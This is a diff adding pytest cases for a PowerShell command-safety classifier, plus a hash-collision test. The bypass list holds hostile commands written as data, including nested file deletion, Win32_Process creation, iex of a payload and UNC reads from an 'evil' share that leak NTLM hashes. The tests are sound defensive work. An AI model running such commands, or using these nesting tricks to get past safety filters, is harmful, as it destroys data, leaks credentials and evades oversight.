@@ -142,8 +142,49 @@ def test_mutating_commands_dangerous(command):
     assert safety.command_dangerous(command) is True
 
 
+@pytest.mark.parametrize(
+    "command",
+    [
+        # structural bypasses — payload rides inside readonly-looking syntax
+        "echo $(Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc'})",
+        "Get-ChildItem | ForEach-Object { [IO.File]::Delete($_.FullName) }",
+        "Get-Process | Where-Object { Remove-Item C:\\x }",
+        "$x = [Diagnostics.Process]::Start('calc')",
+        "Get-Content \\\\evil\\share\\ntlm.txt",
+        "Test-Path \\\\evil\\share",
+        "echo $(Remove-Item C:\\x)",
+        "ForEach-Object { iex 'payload' }",
+        "Invoke-CimInstance -ClassName Win32_Process",
+        "Get-Item file.txt | Invoke-Member",
+    ],
+)
+def test_bypass_payloads_dangerous(command):
+    assert safety.command_dangerous(command) is True
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # legit script-block usage stays readonly
+        "Get-Process | Where-Object {$_.CPU -gt 10}",
+        "Get-ChildItem | ForEach-Object { $_.Name }",
+        "Get-Service | Select-Object @{n='Svc';e={$_.Name}}",
+        "echo $(Get-Date)",
+        "ls | Where-Object { $_.Length -gt 1MB } | Sort-Object Length",
+        "$x = 5; echo $x",
+    ],
+)
+def test_legit_script_blocks_not_dangerous(command):
+    assert safety.command_dangerous(command) is False
+
+
 def test_empty_command_not_dangerous():
     assert safety.command_dangerous("") is False
+
+
+def test_digest_no_separator_collisions():
+    # parts joined with a raw separator would collide across boundaries
+    assert safety.digest("a|b", "c") != safety.digest("a", "b|c")
 
 
 def test_digest_binds_all_params():
